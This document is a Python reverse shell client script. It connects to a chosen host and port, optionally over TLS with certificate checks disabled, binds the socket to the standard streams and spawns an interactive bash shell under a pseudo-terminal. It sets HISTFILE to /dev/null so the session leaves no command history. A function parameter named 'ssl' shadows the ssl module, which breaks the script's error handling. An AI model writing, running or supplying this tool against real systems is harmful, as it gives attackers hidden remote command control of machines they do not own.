#!/usr/bin/env python3

from __future__ import print_function

import os
import sys
import pty
import select
import socket
import ssl
import subprocess
import argparse


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-c', '--cert', default='',
                        help='cert.pem (for oreore server certifications)')
    # NOTE: this default value is used for avoiding
    # 'ValueError: server_hostname cannot be an empty string or start with a leading dot.'
    parser.add_argument('--host', default='',
                        help='server (fully qualified) host name (e.g. www.localhost.com) (if None, address is used)')
    parser.add_argument('-p', '--port', default=8080, type=int,
                        help='server port')
    parser.add_argument(
        '--disable-ssl', action='store_true', help='disable ssl')
    parser.add_argument('-k', '--insecure', action='store_true', help="""
              (TLS) By default, every SSL connection this tool makes is verified to be
              secure.  This  option allows curl to proceed and operate even for server
              connections otherwise considered insecure.

              The server connection is verified by making sure the server's certificate
              contains  the  right name and verifies successfully using the cert store.
            """)
    parser.add_argument('-s', '--shell', default='/bin/bash',
                        help='shell bin path')
    parser.add_argument('address', default='localhost:8080',
                        help='host[:port] server address')
    parser.add_argument('-v', '--verbose', action='store_true')

    args, _ = parser.parse_known_args()
    if len(_) > 0:
        print("extra args {}".format(_), file=sys.stderr)
        parser.print_help()
        sys.exit(1)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    if args.insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    if args.cert:
        context.load_verify_locations(args.cert)

    port = args.port
    splits = args.address.split(':')
    if len(splits) == 1:
        host = splits[0]
    elif len(splits) == 2:
        (host, port) = splits[0], int(splits[1])
    else:
        print("invalid address {}".format(args.address), file=sys.stderr)
        sys.exit(1)

    hostname = host
    if args.host:
        hostname = args.host

    if args.verbose:
        print("target   = {}:{}".format(host, port), file=sys.stderr)
        print("hostname = {}".format(hostname), file=sys.stderr)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        if args.disable_ssl:
            sock.connect((host, port))
            ret = reverse_shell_connect(sock, args.shell, ssl=False)
        else:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                ssock.connect((host, port))
                ret = reverse_shell_connect(ssock, args.shell)
    if not ret:
        sys.exit(1)


def reverse_shell_connect(sock, shell, ssl=True):
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    if not ssl:
        pty.spawn(shell)
        sock.close()
        return True

    master, slave = pty.openpty()
    # Run shell inside it
    shell = subprocess.Popen([shell],
                             preexec_fn=os.setsid,
                             stdin=slave,
                             stdout=slave,
                             stderr=slave,
                             universal_newlines=True)
    try:
        while shell.poll() is None:  # While shell is alive
            # Wait for data on either the socket or the PTY
            r, w, e = select.select([sock, master], [], [])

            if sock in r:  # Reading data from the SSL socket
                try:
                    data = sock.recv(1024)
                except ssl.SSLError as e:
                    if e.errno == ssl.SSL_ERROR_WANT_READ:
                        continue
                    print("error {}".format(e), file=sys.stderr)
                    raise
                if not data:  # End of file.
                    break
                data_left = sock.pending()
                while data_left:
                    data += sock.recv(data_left)
                    data_left = sock.pending()
                os.write(master, data)
            elif master in r:  # Reading data from the PTY.
                sock.write(os.read(master, 2048))
    finally:
        sock.close()
    return True


if __name__ == "__main__":
    main()
